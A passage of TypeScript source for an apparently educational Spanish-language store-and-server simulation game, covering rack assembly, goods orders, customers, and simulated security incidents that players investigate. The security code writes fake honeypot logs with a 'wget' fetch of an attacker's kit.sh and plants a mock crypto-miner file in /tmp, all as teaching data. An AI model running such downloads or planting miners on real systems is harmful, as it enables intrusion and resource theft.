    if (def.racks) this.rackCapacity = Math.max(this.rackCapacity, def.racks);
    if (def.registers) this.registersToPlace += def.registers;
    for (let i = 0; i < (def.stockers ?? 0); i++) this.hireStocker();
    return { ok: true };
  }

  // ── simulación ───────────────────────────────────────────────

  // ── servidores ───────────────────────────────────────────────

  server(id: string): Server | null {
    return this.servers.find((s) => s.id === id || s.hostname === id || s.ip === id) ?? null;
  }

  serverOf(robot: Robot): Server | null {
    return robot.cpu.server ? this.server(robot.cpu.server) : null;
  }

  robotsOn(server: Server): Robot[] {
    return this.robots.filter((r) => r.cpu.server === server.id);
  }

  /**
   * Cuánto tardan las acciones del robot (1 = normal, 0.5 = el doble de rápido): según el tamaño de su código
   * y lo que frene su servidor (ataques, malware, calor, un bucle sin wait()).
   */
  slowdown(robot: Robot): number {
    return slowdown(this.serverOf(robot)) * (robot.code?.factor ?? 1);
  }

  /** Conecta un robot a un servidor (o lo desconecta con null). Si estaba corriendo, se detiene. */
  attach(robotId: string, serverId: string | null): { ok: true } | { ok: false; reason: string } {
    const robot = this.robot(robotId);
    const server = serverId === null ? null : this.server(serverId);
    if (serverId !== null && !server) return { ok: false, reason: `no existe el servidor ${serverId}` };
    if (this.isRunning(robot.id)) {
      this.stopRobot(robot.id, true);
      this.log(robot, "info", "■ Detenido: cambió de servidor");
    }
    robot.cpu.server = server?.id ?? null;
    return { ok: true };
  }

  /** Enciende o apaga un servidor. Al apagarlo, sus robots se detienen. */
  setServerOnline(serverId: string, online: boolean): void {
    const server = this.server(serverId);
    if (!server || server.online === online) return;
    server.online = online;
    if (!online) {
      server.load = 0;
      for (const r of this.robotsOn(server)) {
        if (!this.isRunning(r.id)) continue;
        this.stopRobot(r.id, true);
        this.log(r, "error", `■ Se detuvo: el servidor ${server.hostname} se apagó.`);
        this.events.push({ type: "robot", robotId: r.id, status: "error" });
      }
    }
  }

  // ── tienda en línea, montaje y encendido ────────────────────

  /** Compra en la tienda en línea: llega en el camión a la mañana siguiente. */
  order(items: string[]): { ok: true; total: number } | { ok: false; reason: string } {
    if (!items.length) return { ok: false, reason: "el carrito está vacío" };
    let total = 0;
    const racksComing = this.orders.reduce((n, o) => n + o.items.filter((i) => i === "rack").length, 0);
    const cap = Math.min(RACK_SLOTS, this.rackCapacity);
    if (this.racksOwned + racksComing + items.filter((i) => i === "rack").length > cap) {
      return { ok: false, reason: cap < RACK_SLOTS ? `en la sala solo ${cap === 1 ? "cabe 1 rack" : `caben ${cap} racks`}: amplíala en Mejoras` : `en la sala caben ${cap} racks` };
    }
    for (const id of items) {
      const price = PARTS.find((p) => p.id === id)?.price ?? SERVICES.find((x) => x.id === id)?.price;
      if (price === undefined) return { ok: false, reason: `no existe el producto ${id}` };
      if (id !== "rack" && SERVICES.some((x) => x.id === id) && (this.services.has(id) || this.orders.some((o) => o.items.includes(id)))) return { ok: false, reason: "ya tienes esa mejora" };
      total += price;
    }
    if (this.money < total) return { ok: false, reason: "no alcanza el dinero" };
    this.money -= total;
    this.orders.push({ items: [...items], day: this.day + 1 });
    this.sound("unlock");
    return { ok: true, total };
  }

  // ── Distribuidora El Surtidor: pedidos de mercancía ──────────

  /** Pide mercancía (por cajas). Se paga al pedir; el repartidor llega en SUPPLIER.deliveryTicks con su Excel. */
  orderGoods(lines: GoodsLine[]): { ok: true; order: GoodsOrder } | { ok: false; reason: string } {
    const clean = lines.filter((l) => l.cases > 0);
    if (!clean.length) return { ok: false, reason: "el pedido está vacío" };
    for (const l of clean) {
      if (!(l.product in PRODUCTS)) return { ok: false, reason: `no vendemos ${l.product}` };
      if (!Number.isInteger(l.cases) || l.cases > SUPPLIER.maxCases) return { ok: false, reason: `máximo ${SUPPLIER.maxCases} cajas de cada producto por pedido` };
    }
    if (new Set(clean.map((l) => l.product)).size !== clean.length) return { ok: false, reason: "un producto aparece dos veces" };
    const total = clean.reduce((s, l) => s + l.cases * SUPPLIER.caseUnits * PRODUCTS[l.product].cost, 0);
    if (this.money < total) return { ok: false, reason: "no alcanza el dinero" };
    this.money -= total;
    const order: GoodsOrder = { id: this.goodsOrders.length + 1, lines: clean.map((l) => ({ ...l })), total, arriveTick: this.tick + SUPPLIER.deliveryTicks, file: null };
    this.goodsOrders.push(order);
    this.sound("unlock");
    return { ok: true, order };
  }

  /** Pedidos que todavía no llegan. */
  goodsInTransit(): GoodsOrder[] {
    return this.goodsOrders.filter((o) => o.file === null);
  }

  /** Llega el repartidor: deja el Excel (pandas ya lo puede leer) y, sin base de datos, la mercancía en el almacén. */
  private stepSupplier(): void {
    for (const o of this.goodsOrders) {
      if (o.file !== null || this.tick < o.arriveTick) continue;
      const book = supplierWorkbook(o.id, o.lines, (days) => gameTime(this.day + days, 12).slice(0, 10), (n) => this.rng.int(0, n - 1));
      o.file = book.filename;
      this.workbooks.push(book);
      if (!this.warehouseFromDb) for (const l of o.lines) this.warehouseStock[l.product] += l.cases * SUPPLIER.caseUnits;
      this.sound("door", this.entrance);
      this.events.push({ type: "goods", order: o });
    }
  }

  /** Entrega lo que ya llegó (al amanecer). */
  deliver(force = false): string[] {
    const arrived = this.orders.filter((o) => force || o.day <= this.day);
    if (!arrived.length) return [];
    const items = arrived.flatMap((o) => o.items);
    for (const o of arrived) this.orders.splice(this.orders.indexOf(o), 1);
    for (const id of items) {
      if (id === "rack") this.racksOwned = Math.min(RACK_SLOTS, this.racksOwned + 1);
      else if (SERVICES.some((x) => x.id === id)) this.services.add(id);
      else this.parts.push({ uid: this.nextPartUid++, def: id });
    }
    this.events.push({ type: "delivery", items });
    return items;
  }

  /** La partida en la web: sin servidores, con las piezas del primer servidor en el almacén (tutorial de montaje). */
  startServerTutorial(): void {
    this.servers.length = 0;
    for (const r of this.robots) {
      this.stopRobot(r.id, true);
      r.cpu.server = null;
    }
    for (const id of STARTER_KIT) this.parts.push({ uid: this.nextPartUid++, def: id });
  }

  /** "Saltar" el tutorial: monta srv-01 listo y conecta a los robots. */
  skipServerTutorial(): Server {
    const existing = this.servers.find((x) => x.os && x.ip);
    if (existing) {
      for (const r of this.robots) r.cpu.server ??= existing.id;
      return existing;
    }
    const s = makeServer(SERVER.start.id, SERVER.start.hostname, SERVER.start.ip, SERVER.start.cores, SERVER.start.ramGb);
    s.rack = 0;
    // con las piezas del kit montadas y conectadas (así se puede abrir después para cambiarlas)
    for (const def of STARTER_KIT) install(s.build, { uid: this.nextPartUid++, def });
    for (const c of ["atx24", "cpu8", "sata", "red"] as const) s.build.cables.add(c);
    s.ip = this.servers.some((x) => x.ip === SERVER.start.ip) ? "10.0.0.11" : SERVER.start.ip;
    this.racks[0] = null;
    this.parts.splice(0, this.parts.length, ...this.parts.filter((p) => !STARTER_KIT.includes(p.def)));
    this.servers.push(s);
    for (const r of this.robots) r.cpu.server = s.id;
    return s;
  }

  /** Lo que está montado en un puesto del rack (lo crea vacío si hace falta). */
  rackBuild(slot: number): Build {
    if (slot < 0 || slot >= RACK_SLOTS) throw new Error(`puesto de rack inválido: ${slot}`);
    if (slot >= this.racksOwned) throw new Error("ese puesto no tiene rack: cómpralo en TecnoMercado");
    const srv = this.rackServer(slot);
    if (srv && !srv.maintenance) throw new Error("ese puesto ya tiene un servidor encendido");
    return (this.racks[slot] ??= srv ? srv.build : emptyBuild());
  }

  /**
   * Abre la tapa de un servidor encendido para cambiarle piezas: se apaga (sus robots se detienen) y su montaje vuelve
   * al puesto del rack. Conserva Linux, la red y los archivos; al cerrar la tapa y pasar el POST vuelve a encender.
   */
  openCase(serverId: string): { ok: true } | { ok: false; reason: string } {
    const server = this.server(serverId);
    if (!server || server.rack < 0) return { ok: false, reason: "ese servidor no está en el rack" };
    if (server.maintenance) return { ok: true };
    this.stopRobotsOn(server, `abrieron la tapa de ${server.hostname}`);
    this.setServerOnline(server.id, false);
    server.maintenance = true;
    this.racks[server.rack] = server.build;
    this.emitServer(server, "abierto");
    return { ok: true };
  }

  /** Saca una pieza montada (vuelve al almacén). Lo que va encima de ella hay que sacarlo antes. */
  removePart(slot: number, kind: PartKind, index = 0): { ok: true } | { ok: false; reason: string } {
    const build = this.rackBuild(slot);
    const item = kind === "ram" ? build.ram[index] : build[kind];
    if (!item) return { ok: false, reason: "ahí no hay nada montado" };
    if (kind === "placa" && (build.cpu || build.ram.length || build.gpu)) return { ok: false, reason: "Primero saca la CPU, la RAM y la GPU: van encima de la placa." };
    if (kind === "cpu" && build.disipador) return { ok: false, reason: "Primero saca el disipador: está encima de la CPU." };
    if (kind === "ram") build.ram.splice(index, 1);
    else build[kind] = null;
    this.parts.push(item);
    // los cables que dependían de esa pieza se desconectan solos
    for (const c of [...build.cables]) {
      const needs = cableNeeds(c);
      if (needs.includes(kind) && (kind !== "ram" || !build.ram.length)) build.cables.delete(c);
    }
    return { ok: true };
  }

  /** Desconecta un cable. */
  disconnectCable(slot: number, cable: CableId): void {
    this.rackBuild(slot).cables.delete(cable);
  }

  rackServer(slot: number): Server | undefined {
    return this.servers.find((s) => s.rack === slot);
  }

  /** Monta una pieza del almacén en un puesto del rack. */
  installPart(slot: number, uid: number): { ok: true } | { ok: false; reason: string } {
    if (slot >= this.racksOwned) return { ok: false, reason: "Ese puesto no tiene rack: cómpralo en TecnoMercado." };
    const item = this.parts.find((p) => p.uid === uid);
    if (!item) return { ok: false, reason: "esa pieza no está en el almacén" };
    const build = this.rackBuild(slot);
    const why = canInstall(build, partDef(item.def));
    if (why) return { ok: false, reason: why };
    install(build, item);
    this.parts.splice(this.parts.indexOf(item), 1);
    return { ok: true };
  }

  connectCable(slot: number, cable: CableId): { ok: true } | { ok: false; reason: string } {
    if (slot >= this.racksOwned) return { ok: false, reason: "Ese puesto no tiene rack: cómpralo en TecnoMercado." };
    const build = this.rackBuild(slot);
    const missing = cableNeeds(cable).filter((k) => !build[k] || (Array.isArray(build[k]) && !(build[k] as unknown[]).length));
    if (missing.length) return { ok: false, reason: `${CABLE_NAMES[cable]}: primero monta ${missing.join(" y ")}.` };
    build.cables.add(cable);
    return { ok: true };
  }

  /** Cierra la tapa y presiona el botón: prueba de encendido. Si pasa, el puesto se vuelve un servidor. */
  powerOn(slot: number): { post: PostResult; server: Server | null } {
    const build = this.rackBuild(slot);
    const result = post(build);
    if (!result.ok) return { post: result, server: null };
    const spec = specs(build);
    // un servidor al que le cambiaron piezas: vuelve a encender con su Linux, su red y sus archivos
    const old = this.rackServer(slot);
    if (old?.maintenance) {
      Object.assign(old, { build, cores: spec.cores, cpuLevel: spec.speed, ramGb: spec.ramGb, gpu: spec.gpu, cooling: spec.cooling, cable: spec.cable });
      old.maintenance = false;
      old.load = 0;
      this.racks[slot] = null;
      this.setServerOnline(old.id, true);
      this.emitServer(old, "encendido");
      return { post: result, server: old };
    }
    let n = slot + 1;
    while (this.servers.some((s) => s.id === `srv-${String(n).padStart(2, "0")}`)) n++;
    const server = makeBlankServer(`srv-${String(n).padStart(2, "0")}`, slot, build, spec);
    this.racks[slot] = null;
    this.servers.push(server);
    this.emitServer(server, "encendido");
    return { post: result, server };
  }

  /** Abre una terminal en un servidor. */
  shell(serverId: string): Shell {
    return new Shell(this, serverId);
  }

  /** Hora actual para los logs ("ene  6 21:14:05"). */
  logStamp(): string {
    const n = nowCal(this);
    return stamp(n.day, n.hour);
  }

  emitServer(server: Server, what: string): void {
    this.events.push({ type: "server", serverId: server.id, what });
  }

  private alert(text: string, tone: "bad" | "good" | "info", serverId?: string): void {
    this.events.push({ type: "security", text, tone, serverId });
  }

  stopRobotsOn(server: Server, reason: string): void {
    for (const r of this.robotsOn(server)) {
      if (!this.isRunning(r.id)) continue;
      this.stopRobot(r.id, true);
      this.log(r, "error", `■ Se detuvo: ${reason}.`);
      this.events.push({ type: "robot", robotId: r.id, status: "error" });
    }
  }

  // ── seguridad ────────────────────────────────────────────────

  /** kill al malware: si su archivo sigue en el disco, vuelve a arrancar en un rato. */
  killMalware(server: Server): void {
    const m = server.malware;
    if (!m) return;
    logLine(server, LOGS.syslog, this.logStamp(), "kernel", `proceso ${m.pid} (${m.name}) terminado por ${server.os?.user ?? "root"}`);
    if (server.fs.exists(m.path)) m.respawnAt = this.tick + SECURITY.respawnTicks;
    else this.cleanMalware(server);
  }

  /** Se borró un archivo: si era el malware y su proceso ya no corre, quedó limpio. */
  fileRemoved(server: Server, path: string): void {
    const m = server.malware;
    if (m && m.path === path && m.respawnAt !== null) this.cleanMalware(server);
  }

  private cleanMalware(server: Server): void {
    server.malware = null;
    this.alert(`✓ ${server.hostname} quedó limpio: el malware ya no está.`, "good", server.id);
  }

  /** ufw deny from <ip>: si era el aparato infectado o el atacante, deja de molestar. */
  blocked(server: Server, ip: string): void {
    const dev = this.security.devices.find((d) => d.ip === ip);
    if (dev) dev.blocked = true;
    for (const s of this.servers) {
      if (s.ddos && s.ddos.caseId !== null && this.security.case(s.ddos.caseId)?.deviceIp === ip) {
        s.ddos = null;
        this.alert(`✓ Bloqueaste ${ip}: el tráfico de adentro se detuvo.`, "good", s.id);
      }
    }
    for (const c of this.security.openCases()) if (c.brute && c.brute.ip === ip && c.serverId === server.id) c.brute.banned = true;
  }

  /** Servidores donde puede caer un ataque (con Linux y conectados a internet). */
  private exposedServers(): Server[] {
    return this.servers.filter((s) => s.online && s.os && s.ip && s.gateway && s.cable);
  }

  /** Lanza un ataque ya (los tests y el modo práctica lo usan con técnica y nivel fijos). */
  launchAttack(technique?: Technique, level?: 1 | 2 | 3, serverId?: string): Case | null {
    const targets = this.exposedServers();
    const server = serverId ? this.server(serverId) : targets.length ? this.security.rng.pick(targets) : null;
    if (!server || !server.os) return null;
    const t = technique ?? this.security.pickTechnique();
    const c = this.security.createCase(this, server, t, level ?? this.security.levelFor(this.day));
    const texts: Record<string, string> = {
      fuerza_bruta: `⚠ Muchos intentos de entrar por SSH a ${server.hostname}`,
      malware: `⚠ ${server.hostname} está lento y no son los robots`,
      ddos: `⚠ Tráfico anormal contra ${server.hostname}`,
      sqli: `⚠ Peticiones raras a la página de pedidos (${server.hostname})`,
      phishing: `⚠ Llegó un correo raro a ${server.hostname}`,
    };
    this.alert(`${texts[c.attack]}. Nuevo caso #${c.id} en la página de denuncias.`, "bad", server.id);
    this.sound("angry");
    return c;
  }

  /** Denuncia: si la IP es la real, bug bounty. */
  report(caseId: number, ip: string, evidence = ""): ReportResult {
    const c = this.security.case(caseId);
    if (!c) return { ok: false, title: "Ese caso no existe", message: "" };
    if (c.status !== "abierto") return { ok: false, title: `El caso #${c.id} ya está ${c.status}`, message: "" };
    const res = this.security.explain(c, ip.trim());
    if (res.ok) {
      const ev = evidence.includes(c.realIp) || evidence.includes(c.chain[0]) ? 1 + SECURITY.evidenceBonus : 1;
      const bounty = Math.round((c.bounty * Math.max(0, 1 - SECURITY.hintPenalty * c.hints) * ev) / 100) * 100;
      c.status = "resuelto";
      this.money += bounty;
      this.reputation = Math.min(100, this.reputation + SECURITY.rightReputation);
      this.alert(`✓ Caso #${c.id} cerrado: bug bounty de $${bounty.toLocaleString("es-CO")}`, "good");
      this.sound("cash");
      return {
        ok: true, title: "¡Caso cerrado!",
        message: `La policía encontró al atacante en ${ip.trim()}. Recibes un bug bounty de $${bounty.toLocaleString("es-CO")}${ev > 1 ? " (incluye el bono por la evidencia)" : ""}.`,
        bounty, reputation: SECURITY.rightReputation,
      };
    }
    c.attempts--;
    this.reputation = Math.max(0, this.reputation + (res.reputation ?? 0));
    if (c.attempts <= 0) c.status = "fallido";
    return { ...res, message: `${res.message} ${c.attempts > 0 ? `Te quedan ${c.attempts} intento${c.attempts === 1 ? "" : "s"}.` : "Se acabaron los intentos: el caso se cerró sin culpable."}` };
  }

  /** Pide una pista (descuenta del bounty). null si ya no hay más. */
  hint(caseId: number): string | null {
    const c = this.security.case(caseId);
    if (!c || c.status !== "abierto") return null;
    const hints = techniqueDef(c.technique).hints;
    const idx = (c.freeHint ? 1 : 0) + c.hints;
    if (idx >= hints.length) return null;
    c.hints++;
    return hints[idx];
  }

  /** Pistas que ya se ven en el caso (la gratis de la primera vez + las pedidas). */
  shownHints(c: Case): string[] {
    const hints = techniqueDef(c.technique).hints;
    return hints.slice(0, (c.freeHint ? 1 : 0) + c.hints);
  }

  /** Al amanecer: entregas, firmas del antivirus, casos vencidos y los ataques del día. */
  private startDaySecurity(): void {
    this.deliver();
    for (const s of this.servers) if (s.services.has("clamav-freshclam") && s.gateway) s.avDay = this.day;
    for (const c of this.security.openCases()) {
      if (c.expiresDay < this.day) {
        c.status = "vencido";
        this.alert(`El caso #${c.id} venció: el atacante se escapó.`, "info");
      }
    }
    this.security.nextAttack = null;
    if (this.day >= SECURITY.firstDay && this.exposedServers().length) {
      this.security.nextAttack = this.tick + Math.round(DAY.ticks * (0.15 + this.security.rng.next() * 0.5));
    }
  }

  private stepSecurity(): void {
    const sec = this.security;
    if (sec.nextAttack !== null && this.tick >= sec.nextAttack && !this.night) {
      sec.nextAttack = this.security.rng.next() < SECURITY.extraAttackPerDay * this.day ? this.tick + Math.round(DAY.ticks * 0.3) : null;
      this.launchAttack();
    }
    for (const s of this.servers) {
      if (s.ddos) {
        const c = s.ddos.caseId !== null ? sec.case(s.ddos.caseId) : undefined;
        const inside = c?.technique === "interno";
        s.ddos.level = s.ddos.base * (inside ? 1 : (s.ufw.enabled ? SECURITY.ufwFactor : 1) * (this.services.has("antiddos") ? SECURITY.antiddosFactor : 1));
        if (--s.ddos.ticks <= 0) s.ddos = null;
      }
      const m = s.malware;
      if (m && m.respawnAt !== null && this.tick >= m.respawnAt) {
        if (s.fs.exists(m.path)) {
          m.respawnAt = null;
          m.pid = s.nextPid++;
          logLine(s, LOGS.syslog, this.logStamp(), "CRON[880]", `(root) CMD (${m.path})`);
        } else this.cleanMalware(s);
      }
    }
    for (const c of sec.openCases()) {
      const s = this.server(c.serverId);
      if (!s || !s.online) continue;
      if (c.brute && c.brute.ticks > 0 && this.tick % SECURITY.bruteEvery === 0) this.stepBrute(c, s);
      if (c.honeypot && !c.honeypot.done && s.services.has("cowrie") && ++c.honeypot.progress >= SECURITY.honeypotTicks) {
        c.honeypot.done = true;
        const when = this.logStamp();
        const from = c.vpnIp ?? c.chain[0];
        for (const line of [
          `${when} [cowrie] Nueva conexión: ${from}:${40000 + c.id} (SSH-2.0-OpenSSH_8.9)`,
          `${when} [cowrie] login attempt [root/123456] succeeded`,
          `${when} [cowrie] CMD: uname -a`,
          `${when} [cowrie] CMD: wget http://${c.chain[0]}/kit.sh -O /tmp/kit.sh`,
          `${when} [cowrie] Conexión cerrada (${from})`,
        ]) s.fs.append(LOGS.cowrie, line);
        this.alert(`La trampa de ${s.hostname} atrapó algo: revisa /var/log/cowrie/cowrie.log`, "info", s.id);
      }
    }
  }

  private stepBrute(c: Case, s: Server): void {
    const b = c.brute!;
    b.ticks -= SECURITY.bruteEvery;
    if (b.banned || s.banned.has(b.ip) || (s.ufw.enabled && s.ufw.deny.includes(b.ip)) || !s.services.has("ssh")) return;
    b.tries++;
    const pid = 2000 + (this.tick % 7000);
    logLine(s, LOGS.auth, this.logStamp(), `sshd[${pid}]`, `Failed password for root from ${b.ip} port ${40000 + b.tries} ssh2`);
    if (s.services.has("fail2ban")) {
      const n = (s.failed.get(b.ip) ?? 0) + 1;
      s.failed.set(b.ip, n);
      if (n >= SECURITY.banAfter) {
        s.banned.add(b.ip);
        b.banned = true;
        s.fs.append(LOGS.fail2ban, `${this.logStamp()} fail2ban.actions: NOTICE [sshd] Ban ${b.ip}`);
        this.alert(`✓ fail2ban bloqueó a ${b.ip} en ${s.hostname}`, "good", s.id);
      }
      return;
    }
    if (!b.succeeded && s.os && !strongPassword(s.os.password) && b.tries >= SECURITY.bruteSuccessAfter && !s.malware) {
      b.succeeded = true;
      logLine(s, LOGS.auth, this.logStamp(), `sshd[${pid}]`, `Accepted password for ${s.os.user} from ${b.ip} port ${40000 + b.tries} ssh2`);
      const path = "/tmp/.kworkerd";
      s.fs.write(path, ["\x7fELF", "GLIBC_2.17", "--donate-level=0", "stratum+tcp://pool-minero.test:3333"].join("\n"), true);
      s.malware = { pid: s.nextPid++, name: "kworkerd", path, steal: SECURITY.minerSteal, day: this.day, respawnAt: null, caseId: c.id };
      this.alert(`⚠ ¡Alguien adivinó la contraseña de ${s.hostname} y dejó algo corriendo! (passwd + fail2ban)`, "bad", s.id);
    }
  }

  /** Un tick de un servidor: reparte la CPU entre sus robots, los hace pensar y mide la carga. */
  private stepServer(server: Server): void {
    const active = this.robotsOn(server).filter((r) => r.vm && (r.vm.status === "running" || r.vm.status === "waiting"));
    // el malware se lleva su parte de la CPU antes que los robots
    const stolen = server.online && server.malware && server.malware.respawnAt === null ? Math.round(server.malware.steal * capacity(server)) : 0;
    updateTemp(server, this.services.has("aire"));
    if (!server.online || active.length === 0) {
      updateLoad(server, stolen);
      return;
    }
    // cada robot avanza según su velocidad: código corto = hasta 2 pasos por tick; largo o servidor saturado = menos
    const runs = new Map<Robot, number>();
    for (const r of active) {
      r.cpu.clock += 1 / this.slowdown(r);
      const n = Math.min(3, Math.floor(r.cpu.clock));
      r.cpu.clock -= n;
      if (n > 0) runs.set(r, n);
    }
    const due = [...runs.keys()];
    if (due.length === 0) return; // tick saltado: la carga se mide solo cuando piensan
    const budgets = shareCpu(server, due.map((r) => r.cpu), stolen);
    let used = stolen;
    due.forEach((robot, i) => {
      const vm = robot.vm!;
      vm.opsPerTick = budgets[i];
      const before = vm.totalOps;
      for (let k = 0; k < runs.get(robot)!; k++) {
        this.stepRobot(robot);
        if (robot.vm !== vm || (vm.status !== "running" && vm.status !== "waiting")) break;
      }
      const ops = Math.round((vm.totalOps - before) / runs.get(robot)!);
      robot.cpu.lastOps = ops;
      robot.cpu.lastBudget = budgets[i];
      used += ops;
    });
    updateLoad(server, used);
  }

  step(): void {
    this.tick++;
    for (const server of this.servers) this.stepServer(server);
    this.stepSecurity();
    this.stepSupplier();
    this.updateCustomers();
    this.spawnCustomers();
    this.spawnTestCustomers();
    if (this.cycle && !this.night && this.tick - this.dayStartTick >= DAY.ticks) this.closeStore();
    if (this.incomes.length > 500) this.incomes = this.incomes.filter((i) => i.tick > this.tick - 600);
  }

  private stepRobot(robot: Robot): void {
    {
      const vm = robot.vm!;
      const status = vm.tick();
      if (status !== "waiting") robot.action = null;
      if (status === "paused") {
        this.events.push({ type: "robot", robotId: robot.id, status });
        this.sound("paused");
      } else if (status === "error") this.reportError(robot);
      else if (status === "done") {
        this.log(robot, "info", "✓ El script terminó");
        this.events.push({ type: "robot", robotId: robot.id, status });
      }
    }
  }

  private reportError(robot: Robot): void {
    const err = robot.vm?.error;
    if (!err) return;
    this.log(robot, "error", err.format());
    this.events.push({ type: "float", x: robot.x, y: robot.y, text: "¡error!", tone: "bad" });
    this.events.push({ type: "robot", robotId: robot.id, status: "error" });
    this.sound("error", robot);
    robot.moving = null;
    robot.action = null;
  }

  log(robot: Robot, kind: ConsoleLine["kind"], text: string): void {
    robot.console.push({ kind, text, tick: this.tick });
    if (robot.console.length > MAX_CONSOLE) robot.console.splice(0, robot.console.length - MAX_CONSOLE);
  }

  float(at: Pos, text: string, tone: "good" | "bad" | "info"): void {
    this.events.push({ type: "float", x: at.x, y: at.y, text, tone });
  }

  addReputation(delta: number, at?: Pos): void {
    this.reputation = Math.max(0, Math.min(100, this.reputation + delta));
    if (at && delta !== 0) this.float(at, `${delta > 0 ? "+" : ""}${delta} rep`, delta > 0 ? "good" : "bad");
  }

  earn(amount: number, at?: Pos): void {
    this.money = Math.max(0, this.money + amount);
    if (amount > 0) this.incomes.push({ tick: this.tick, amount });
    if (at && amount !== 0) {
      this.float(at, `${amount > 0 ? "+" : "-"}$${Math.abs(Math.round(amount)).toLocaleString("es-CO")}`, amount > 0 ? "good" : "bad");
    }
  }

  /**
   * De noche, cada caja activa sin fila recibe un cliente de prueba con productos para probar el código del cajero.
   * No paga de verdad, no gasta productos y no se guarda en ninguna parte.
   */
  private spawnTestCustomers(): void {
    if (!this.night) return;
    for (const reg of this.registers) {
      if (!reg.active || reg.queue.length) continue;
      if (reg.testCooldown > 0) {
        reg.testCooldown--;
        continue;
      }
      const products = PRODUCT_NAMES.filter((p) => PRODUCTS[p].basic || this.shelves.some((s) => s.product === p));
      const cart = Array.from({ length: this.rng.int(CUSTOMER.itemsMin, CUSTOMER.itemsMax) }, () => products[this.rng.int(0, products.length - 1)]);
      const at = { x: Math.min(reg.x + 1, this.openWidth - 1), y: reg.y };
      const c: Customer = {
        id: this.nextTestId--, x: at.x, y: at.y, list: [...cart], listIndex: cart.length, cart, state: "queue", atRegister: false,
        patience: Infinity, mood: null, stepCooldown: CUSTOMER.ticksPerStep, browse: 0,
        checkout: { scanned: 0, charged: null, paid: null, change: null, done: false }, register: reg, test: true,
      };
      reg.queue.push(c);
      this.customers.push(c);
      this.float(at, "🧪 Cliente de prueba", "info");
    }
  }

  private spawnCustomers(): void {
    if (!this.customersEnabled || this.customers.length >= this.maxCustomers) return;
    if (!this.registers.some((r) => r.active)) return; // con todas las cajas cerradas no entra nadie
    // cada día llegan más clientes (es como un nivel nuevo)
    // los productos premium que están en los estantes atraen clientes nuevos
    const premium = PRODUCT_NAMES.filter((p) => !PRODUCTS[p].basic && this.shelves.some((s) => s.product === p && s.stock > 0));
    const perMinute = CUSTOMER.basePerMinute * (0.2 + this.reputation / 62.5) * (1 + DAY.customerGrowth * (this.day - 1)) * (1 + SUPPLIER.premiumPull * premium.length) * (1 + this.marketingBoost);
    const first = this.nextCustomerId === 1 && this.tick >= this.openedTick + CUSTOMER.firstArrivalTick;
    if (this.nextCustomerId === 1 && !first) return;
    if (!first && this.rng.next() >= perMinute / (60 * TICKS_PER_SECOND)) return;
    // piden los básicos y lo premium que la tienda vende (que tiene estante); lo premium lo piden más
    const products = PRODUCT_NAMES.filter((p) => PRODUCTS[p].basic || this.shelves.some((s) => s.product === p));
    const weight = products.reduce((t, p) => t + PRODUCTS[p].demand, 0);
    const pickOne = (): ProductName => {
      let r = this.rng.next() * weight;
      for (const p of products) if ((r -= PRODUCTS[p].demand) < 0) return p;
      return products[products.length - 1];
    };
    const n = this.rng.int(CUSTOMER.itemsMin, CUSTOMER.itemsMax);
    const list = Array.from({ length: n }, pickOne);
    this.sound("door", this.entrance);
    this.record({ kind: "customer_arrived", customerId: this.nextCustomerId, at: this.now, wanted: list });
    this.customers.push({
      id: this.nextCustomerId++,
      x: this.entrance.x,
      y: this.entrance.y,
      list,
      listIndex: 0,
      cart: [],
      state: "shopping",
      atRegister: false,
      patience: Math.round(CUSTOMER.patienceTicks * (1 + this.patienceBoost)),
      mood: null,
      stepCooldown: CUSTOMER.ticksPerStep,
      browse: CUSTOMER.browseTicks,
      checkout: { scanned: 0, charged: null, paid: null, change: null, done: false },
      register: null,
    });
  }

  private customerTarget(c: Customer): Pos {
    if (c.state === "shopping") {
      // si ningún estante tiene lo que busca, igual entra a buscarlo en alguno (no se devuelve desde la puerta)
      const shelf = this.shelfFor(c.list[c.listIndex], c) ?? this.shelves[(c.id + c.listIndex) % this.shelves.length];
      return shelf ?? this.entrance;
    }
    if (c.state === "queue" && c.register) {
      const reg = c.register;
      const i = reg.queue.indexOf(c);
      return { x: Math.min(this.openWidth - 1, reg.x + Math.min(QUEUE_CELLS, 1 + i)), y: reg.y };
    }
    return this.entrance;
  }

  private updateCustomers(): void {
    for (const c of [...this.customers]) {
      const target = this.customerTarget(c);
      const arrived = c.x === target.x && c.y === target.y;

      if (!arrived) {
        c.atRegister = false;
        if (--c.stepCooldown <= 0) {
          c.stepCooldown = CUSTOMER.ticksPerStep;
          if (c.x !== target.x) c.x += Math.sign(target.x - c.x);
          else c.y += Math.sign(target.y - c.y);
        }
      } else if (c.state === "shopping" && c.browse > 0) {
        c.browse--; // mira el estante un momento
      } else if (c.state === "shopping") {
        c.browse = CUSTOMER.browseTicks;
        const product = c.list[c.listIndex];
        const shelf = this.shelfAt(c.x, c.y);
        if (shelf && shelf.product === product && shelf.stock > 0) {
          shelf.stock--;
          c.cart.push(product);
        } else {
          this.float(c, `¿No hay ${product}?`, "bad");
          this.sound("missing", c);
          this.record({ kind: "stockout", customerId: c.id, at: this.now, product });
          this.addReputation(REPUTATION.missingProduct);
        }
        c.listIndex++;
        if (c.listIndex >= c.list.length) {
          if (c.cart.length === 0) {
            c.state = "leaving";
            c.mood = "enojado";
            this.record({ kind: "customer_left", customerId: c.id, at: this.now, outcome: "se fue sin comprar", mood: c.mood });
            this.today.lost++;
          } else {
            c.state = "queue";
            // la caja activa con menos fila (si todas están cerradas, la de siempre: ahí esperará hasta cansarse)
            c.register = this.pickRegister(c) ?? this.register;
            c.register.queue.push(c);
          }
        }
      } else if (c.state === "queue") {
        c.atRegister = !!c.register && c.register.queue[0] === c;
      } else if (c.state === "leaving") {
        this.customers = this.customers.filter((x) => x !== c);
        continue;
      }

      // Paciencia: corre mientras espera en la cola y nadie ha empezado a atenderlo.
      const started = c.checkout.scanned > 0 || c.checkout.charged !== null;
      if (c.state === "queue" && !started && !c.test && --c.patience <= 0) {
        if (c.register) c.register.queue = c.register.queue.filter((x) => x !== c);
        c.state = "leaving";
        c.atRegister = false;
        c.mood = "enojado";
        this.float(c, "¡Me voy!", "bad");
        this.sound("angry", c);
        this.record({ kind: "customer_left", customerId: c.id, at: this.now, outcome: "abandonó la fila", mood: c.mood });
        this.today.lost++;
        this.addReputation(REPUTATION.abandonQueue);
        for (const p of c.cart) {
          const shelf = this.shelves.find((s) => s.product === p && s.stock < s.capacity);
          if (shelf) shelf.stock = Math.min(shelf.capacity, shelf.stock + 1); // deja las cosas en el estante
        }
      }
    }
  }

  /** Lo que entrega el cliente: a veces exacto, si no el billete más pequeño que alcance. */
  customerPays(charged: number): number {
    if (charged <= 0) return 0;
